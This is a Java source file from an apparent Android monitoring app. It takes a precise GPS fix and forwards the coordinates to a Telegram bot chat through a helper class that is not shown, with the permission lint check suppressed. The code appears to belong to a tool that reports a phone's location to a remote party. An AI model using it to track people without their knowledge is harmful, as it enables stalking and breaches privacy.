package com.nehal.telegrammonitor;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.os.Looper;

import com.google.android.gms.location.*;

public class LocationHelper {

    @SuppressLint("MissingPermission")
    public static void sendLocation(Context context, String botToken, String chatId) {
        FusedLocationProviderClient fusedLocationClient = LocationServices.getFusedLocationProviderClient(context);

        LocationRequest locationRequest = LocationRequest.create()
                .setPriority(Priority.PRIORITY_HIGH_ACCURACY)
                .setInterval(1000)
                .setNumUpdates(1);

        fusedLocationClient.requestLocationUpdates(locationRequest, new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult result) {
                Location location = result.getLastLocation();
                if (location != null) {
                    String lat = String.valueOf(location.getLatitude());
                    String lon = String.valueOf(location.getLongitude());

                    TelegramUploader.sendLocation(botToken, chatId, lat, lon);
                }
            }
        }, Looper.getMainLooper());
    }
}